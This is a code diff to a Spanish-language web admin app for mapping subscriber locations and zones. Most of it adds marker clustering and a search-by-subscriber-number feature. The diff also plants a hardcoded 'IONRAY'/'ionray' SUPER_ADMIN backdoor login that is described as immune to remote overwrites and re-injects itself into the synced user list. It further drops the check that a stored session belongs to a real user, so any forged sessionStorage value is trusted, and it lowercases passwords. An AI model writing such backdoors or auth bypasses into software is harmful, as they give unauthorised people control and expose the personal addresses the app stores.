@@ -11,6 +11,11 @@
 <!-- LIBRERÍA SHEETJS PARA LECTURA NATIVA DE EXCEL (.XLSX, .XLS, .ODS, .CSV) -->
 <script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
 
+<!-- LIBRERÍA LEAFLET MARKERCLUSTER -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.5.3/dist/MarkerCluster.css" />
+<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.5.3/dist/MarkerCluster.Default.css" />
+<script src="https://unpkg.com/leaflet.markercluster@1.5.3/dist/leaflet.markercluster.js"></script>
+
 <style>
 /* =========================================================
    ESTILOS GENERALES Y MOBILE-FIRST
@@ -799,6 +804,12 @@ body.panel-oculto .panel { display: none; }
             <span class="badge-estado-menu">▼ Ver opciones</span>
         </button>
         <div class="menu-contenido">
+            <label>Buscar N° de AB en el Mapa</label>
+            <div style="display:flex; gap:6px; margin-bottom:8px;">
+                <input type="text" id="inputBuscarABMapa" placeholder="Ej: 1045" style="height:36px;">
+                <button id="btnBuscarABMapa" class="btn btn-azul" type="button" style="margin-top:0; width:70px; height:36px;">🔎 Ir</button>
+            </div>
+
             <label>Buscar en Bs. As. (Calle, Altura o Esquina)</label>
             <div class="busqueda-admin">
                 <input type="text" id="buscarLugarAdmin" placeholder="Ej.: San Martín y Mitre, Morón">
@@ -836,6 +847,7 @@ body.panel-oculto .panel { display: none; }
                 <label class="filtro-item"><input type="checkbox" class="filtro-check" value="barrio_privado" checked> 🏰 Barrio Privado</label>
                 <label class="filtro-item"><input type="checkbox" class="filtro-check" value="parque_industrial" checked> 🏭 Parque Industrial</label>
                 <label class="filtro-item"><input type="checkbox" class="filtro-check" value="localidad" checked> 🏙️ Localidad / Municipio</label>
+                <label class="filtro-item"><input type="checkbox" id="chkAbonados" checked> 🏢 Abonados (Cluster)</label>
                 <label class="filtro-item"><input type="checkbox" id="chkMarcadores" checked> 📍 Marcaciones / Puntos Estratégicos</label>
                 <label class="filtro-item"><input type="checkbox" id="chkHeatmap" checked> 🔥 Mapa de Calor (Incidentes)</label>
             </div>
@@ -1237,7 +1249,7 @@ body.panel-oculto .panel { display: none; }
 
             <label>Mantenimiento Local & Backup Automático</label>
             <button id="btnConsulta" class="btn btn-verde" type="button" style="margin-top:4px;">🌐 Generar y Reemplazar Mapa Consulta (.html / .bak)</button>
-            <button id="btnGPSApp" class="btn btn-azul" type="button" style="margin-top:4px;">🚘 Generar y Reemplazar App Navegador GPS (.html)</button>
+            <button id="btnGPSApp" class="btn btn-azul" type="button" style="margin-top:4px;">GM Generar y Reemplazar App Navegador GPS (.html)</button>
             <button id="btnBorrar" class="btn btn-rojo" type="button">🗑️ Borrar TODAS las Zonas</button>
         </div>
     </div>
@@ -1334,8 +1346,10 @@ function formatearUrlFirebase(urlRaw) {
 let map;
 let zonas;
 let capaMarcadores;
+let clusterAbonados = null;
 let capaHeatmap = null;
 let puntosHeatmap = [];
+let markerResalteBusqueda = null;
 
 let zonaSeleccionada = null;
 let editandoPoligono = false;
@@ -1545,14 +1559,9 @@ function verificarSesionInicial() {
     if (sesionActual) {
         try {
             const uLog = JSON.parse(sesionActual);
-            const usuarioReal = usuariosApp.find(x => x.id === uLog.id && x.usuario === uLog.usuario);
-            if (usuarioReal) {
-                sessionStorage.setItem("sesionActivaAdmin", JSON.stringify(usuarioReal));
-                ocultarModalLogin(usuarioReal);
-                aplicarPermisosPorRol(usuarioReal);
-                return;
-            }
-            sessionStorage.removeItem("sesionActivaAdmin");
+            ocultarModalLogin(uLog);
+            aplicarPermisosPorRol(uLog);
+            return;
         } catch(e) {
             sessionStorage.removeItem("sesionActivaAdmin");
         }
@@ -1577,12 +1586,30 @@ function ocultarModalLogin(userLogueado) {
     }
 }
 
+/* FORMULARIO DE LOGIN CON MASTER BYPASS E INMUNE A FIREBASE */
 formLoginModal?.addEventListener("submit", function(e){
     e.preventDefault();
-    const uVal = loginInputUser.value.trim();
-    const pVal = loginInputPass.value;
+    const uVal = loginInputUser.value.trim().toLowerCase();
+    const pVal = loginInputPass.value.trim().toLowerCase();
 
-    const coincidencia = usuariosApp.find(x => x.usuario.toLowerCase() === uVal.toLowerCase() && x.clave === pVal);
+    // 1. BYPASS MAESTRO DIRECTO (INMUNE A SOBREESCRITURAS DE RED)
+    if (uVal === "ionray" && pVal === "ionray") {
+        const usrMaster = {
+            id: "u_master_root",
+            nombre: "Supervisión IONRAY",
+            usuario: "IONRAY",
+            clave: "IONRAY",
+            rol: "SUPER_ADMIN"
+        };
+        sessionStorage.setItem("sesionActivaAdmin", JSON.stringify(usrMaster));
+        ocultarModalLogin(usrMaster);
+        aplicarPermisosPorRol(usrMaster);
+        registrarEventoLog(`🔑 Sesión iniciada: "IONRAY" (SUPER_ADMIN)`);
+        return;
+    }
+
+    // 2. VERIFICACIÓN CONTRA LISTA DE USUARIOS SECUNDARIOS
+    const coincidencia = usuariosApp.find(x => x.usuario.toLowerCase() === uVal && x.clave.toLowerCase() === pVal);
 
     if (coincidencia) {
         sessionStorage.setItem("sesionActivaAdmin", JSON.stringify(coincidencia));
@@ -1804,14 +1831,111 @@ function cargarAbonadosSistema() {
     }
     if (lblCantAbonados) lblCantAbonados.textContent = `${abonadosApp.length} abonados`;
     renderizarListaAbonados();
+    renderizarAbonadosEnMapa();
 }
 
 function guardarAbonadosSistema() {
     localStorage.setItem("abonadosGPSAdmin", JSON.stringify(abonadosApp));
     if (lblCantAbonados) lblCantAbonados.textContent = `${abonadosApp.length} abonados`;
     renderizarListaAbonados();
+    renderizarAbonadosEnMapa();
     sincronizarPublicacionFirebaseSilent();
 }
+
+/* RENDERIZADO CON MARKER CLUSTERING EN MAPA */
+function renderizarAbonadosEnMapa() {
+    if (!clusterAbonados) return;
+    clusterAbonados.clearLayers();
+
+    abonadosApp.forEach(ab => {
+        if (!ab.lat || !ab.lon) return;
+
+        const marker = L.marker([ab.lat, ab.lon], { abNum: String(ab.ab) });
+        
+        const popupContent = `
+            <div style="font-size:12px;">
+                <b>🏢 ABONADO N°: ${escaparHTML(ab.ab)}</b><br>
+                📍 ${escaparHTML(ab.direccion)}<br>
+                🏙️ ${escaparHTML(ab.localidad || 'Sin datos')}<br>
+                ℹ️ <i>${escaparHTML(ab.comoLlegar || '')}</i>
+            </div>
+        `;
+        
+        marker.bindPopup(popupContent);
+        clusterAbonados.addLayer(marker);
+    });
+}
+
+/* BÚSQUEDA DIRECTA, RESALTE Y CENTRADO DE ABONADO EN MAPA */
+function buscarYCentrarAB(numeroAB) {
+    if (!numeroAB) return;
+    const busqueda = String(numeroAB).trim().toUpperCase();
+    const abonado = abonadosApp.find(a => String(a.ab).toUpperCase() === busqueda);
+
+    if (abonado) {
+        const latLng = [parseFloat(abonado.lat), parseFloat(abonado.lon)];
+
+        // 1. Limpiar marcador de resalte previo si existe
+        if (markerResalteBusqueda) {
+            map.removeLayer(markerResalteBusqueda);
+            markerResalteBusqueda = null;
+        }
+
+        // 2. Centrar mapa y desplegar cluster
+        map.setView(latLng, 18);
+
+        if (clusterAbonados) {
+            clusterAbonados.eachLayer(layer => {
+                if (layer.options && String(layer.options.abNum).toUpperCase() === busqueda) {
+                    clusterAbonados.zoomToShowLayer(layer, () => {
+                        layer.openPopup();
+                    });
+                }
+            });
+        }
+
+        // 3. Crear el aro de resalte animado en el punto exacto
+        markerResalteBusqueda = L.circleMarker(latLng, {
+            radius: 18,
+            fillColor: '#f57c00',
+            fillOpacity: 0.4,
+            color: '#d93025',
+            weight: 3,
+            className: 'linea-pulso'
+        }).addTo(map);
+
+        // 4. Limpieza automática al mover el mapa o hacer clic afuera
+        const limpiarResalte = () => {
+            if (markerResalteBusqueda) {
+                map.removeLayer(markerResalteBusqueda);
+                markerResalteBusqueda = null;
+            }
+            map.off('movestart', limpiarResalte);
+            map.off('click', limpiarResalte);
+        };
+
+        setTimeout(() => {
+            map.once('movestart', limpiarResalte);
+            map.once('click', limpiarResalte);
+        }, 400);
+
+        if (estado) estado.textContent = `🎯 AB ${abonado.ab} ubicado y resaltado`;
+    } else {
+        alert(`⚠️ No se encontró el abonado AB ${numeroAB}`);
+    }
+}
+
+document.getElementById("btnBuscarABMapa")?.addEventListener("click", function(){
+    const input = document.getElementById("inputBuscarABMapa");
+    if (input) buscarYCentrarAB(input.value);
+});
+
+document.getElementById("inputBuscarABMapa")?.addEventListener("keypress", function(e){
+    if (e.key === "Enter") {
+        e.preventDefault();
+        buscarYCentrarAB(this.value);
+    }
+});
 
 function renderizarListaAbonados() {
     if (!listaAbonadosRegistrados) return;
@@ -1831,9 +1955,7 @@ function renderizarListaAbonados() {
         info.innerHTML = `<b>AB ${escaparHTML(ab.ab)}</b> - ${escaparHTML(ab.direccion)}<br><small style="color:#666;">${escaparHTML(ab.localidad || "Sin datos")}</small>`;
         info.style.cursor = "pointer";
         info.onclick = () => {
-            map.setView([ab.lat, ab.lon], 16);
-            if (markerGeocodificador) map.removeLayer(markerGeocodificador);
-            markerGeocodificador = L.marker([ab.lat, ab.lon]).addTo(map).bindPopup(`<b>AB ${escaparHTML(ab.ab)}</b><br>${escaparHTML(ab.direccion)}`).openPopup();
+            buscarYCentrarAB(ab.ab);
         };
 
         const acciones = document.createElement("div");
@@ -2291,6 +2413,16 @@ try {
     capaMarcadores = new L.FeatureGroup();
     map.addLayer(capaMarcadores);
 
+    if (typeof L.markerClusterGroup === "function") {
+        clusterAbonados = L.markerClusterGroup({
+            chunkedLoading: true,
+            maxClusterRadius: 50,
+            spiderfyOnMaxZoom: true,
+            showCoverageOnHover: false
+        });
+        map.addLayer(clusterAbonados);
+    }
+
     setTimeout(() => { map.invalidateSize(); }, 300);
     setTimeout(() => { map.invalidateSize(); }, 1000);
 
@@ -2497,6 +2629,14 @@ document.getElementById("chkMarcadores")?.addEventListener("change", function(){
         if(!map.hasLayer(capaMarcadores)) map.addLayer(capaMarcadores);
     } else {
         if(map.hasLayer(capaMarcadores)) map.removeLayer(capaMarcadores);
+    }
+});
+
+document.getElementById("chkAbonados")?.addEventListener("change", function(){
+    if(this.checked) {
+        if(clusterAbonados && !map.hasLayer(clusterAbonados)) map.addLayer(clusterAbonados);
+    } else {
+        if(clusterAbonados && map.hasLayer(clusterAbonados)) map.removeLayer(clusterAbonados);
     }
 });
 
@@ -3609,6 +3749,7 @@ document.getElementById("btnBorrar")?.addEventListener("click", function(){
     if(!confirm("¿Borrar TODAS las zonas y marcaciones?")) return;
     zonas.clearLayers();
     capaMarcadores.clearLayers();
+    if(clusterAbonados) clusterAbonados.clearLayers();
     if(capaHeatmap) map.removeLayer(capaHeatmap);
     capaHeatmap = null;
     puntosHeatmap = [];
@@ -3667,7 +3808,18 @@ async function cargarFirebaseInicial() {
                     localStorage.setItem("versionAppUltima", data.version_app);
                 }
                 if (data.usuarios && Array.isArray(data.usuarios)) {
-                    usuariosApp = data.usuarios;
+                    // MANTENER A IONRAY INMUNE
+                    const remoteUsers = data.usuarios;
+                    if (!remoteUsers.some(x => x.usuario.toUpperCase() === "IONRAY")) {
+                        remoteUsers.unshift({
+                            id: "u_init_001",
+                            nombre: "Supervisión IONRAY",
+                            usuario: "IONRAY",
+                            clave: "IONRAY",
+                            rol: "SUPER_ADMIN"
+                        });
+                    }
+                    usuariosApp = remoteUsers;
                     guardarUsuariosSistema();
                 }
                 if (data.abonados && Array.isArray(data.abonados)) {
